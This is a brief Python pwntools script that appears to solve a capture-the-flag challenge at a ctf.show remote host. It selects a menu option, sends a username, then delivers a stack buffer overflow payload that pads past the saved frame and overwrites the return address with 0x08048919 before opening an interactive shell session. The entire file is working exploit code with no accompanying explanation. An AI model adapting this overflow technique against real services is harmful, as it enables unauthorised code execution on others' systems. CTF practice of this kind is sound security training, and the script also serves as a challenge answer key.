from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28223)
context.terminal
io.sendlineafter(b'Your choice:',b'1')
io.sendlineafter(b'username:',b'bit')
io.recv()
payload = b'a'*(0x14+4)+p32(0x08048919)
payload = payload.ljust(0x104,b'a')
io.sendline(payload)
io.interactive()